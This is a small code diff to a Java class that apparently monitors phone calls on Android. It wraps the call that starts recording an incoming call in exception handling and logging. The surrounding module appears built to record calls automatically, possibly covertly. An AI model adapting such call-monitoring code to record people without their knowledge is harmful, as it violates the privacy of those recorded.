@@ -206,7 +206,14 @@ public class BroadcastMonitorCall  {
 								if (Cfg.DEBUG) {
 									Check.log(TAG + " (manageReceive): starting call"); //$NON-NLS-1$
 								}
-								startRecordCall();
+								try {
+									startRecordCall();
+								}catch(Exception ex){
+									if (Cfg.EXCEPTION) {
+										Check.log(TAG + " (manageReceive) Error: starting call " + ex);
+										ex.printStackTrace();
+									}
+								}
 							}else{
 								if (Cfg.DEBUG) {
 									Check.log(TAG + " (manageReceive): NOT starting call ModuleCall.self()= " + ModuleCall.self()); //$NON-NLS-1$
